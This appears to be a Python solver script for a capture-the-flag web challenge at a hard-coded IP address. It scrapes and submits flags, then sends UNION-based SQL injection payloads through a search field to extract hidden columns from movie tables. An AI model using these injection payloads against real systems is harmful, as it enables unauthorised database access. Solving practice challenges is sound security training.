import requests
import re
from bs4 import BeautifulSoup

def recuperer_contenu_specifique(url):
    try:
        reponse = requests.get(url)

        if reponse.status_code == 200:
            contenu = re.findall(r'###CTF_\d+:([A-Za-z0-9]+)###', reponse.text)
            resultat = ''.join(contenu)
            print("flag 1:", resultat)
            return resultat
        else:
            print(f"La requête a échoué avec le code d'état {reponse.status_code}")

    except Exception as e:
        print(f"Une erreur s'est produite : {e}")

def envoyer_flag(url, flag):
    flag_data = {'ctf': flag}
    response = requests.post(url, data=flag_data)
    return response.text

def recuperer_et_trier_par_id(site_flag2):
    soup = BeautifulSoup(site_flag2, 'html.parser')
    table = soup.find('table', id='table_yellow')

    data_list = {}

    for row in table.find_all('tr'):
        cells = row.find_all('td')
        if cells[0].get_text() != 'ID':
            data_list[int(cells[0].get_text())] = cells[1].get_text()

    data_list = dict(sorted(data_list.items()))
    caracteres_regroupes = ''.join([valeur[valeur.find('#') + 1] for valeur in data_list.values() if '#' in valeur])

    print("flag 2:", caracteres_regroupes)

def extraire_flag(url, flag1, injection):
    flag_data = {'ctf': flag1, 'search': injection}
    response = requests.post(url, data=flag_data)
    match = re.search(r'#CTF([^#]+)#', response.text)
    
    if match:
        ctf_part = match.group(0)
        return ctf_part[1:-1]

def flag3(url, flag1):
    injection = "s'UNION SELECT ctf_65deab50,2,3,4,5,6,7,8 FROM movies WHERE ctf_65deab50 is not NULL #"
    flag = extraire_flag(url, flag1, injection)
    print("flag 3:", flag)

def flag4(url, flag1):
    injection = "s' UNION SELECT ctf_65deab50,2,3,4,5,6,7,8 FROM movies_archive_4dfe560c #"
    flag = extraire_flag(url, flag1, injection)
    print("flag 4:", flag)

url = "http://92.205.177.169:83/"
flag1 = recuperer_contenu_specifique(url)
site_flag2 = envoyer_flag(url, flag1)
recuperer_et_trier_par_id(site_flag2)
flag3(url, flag1)
flag4(url, flag1)
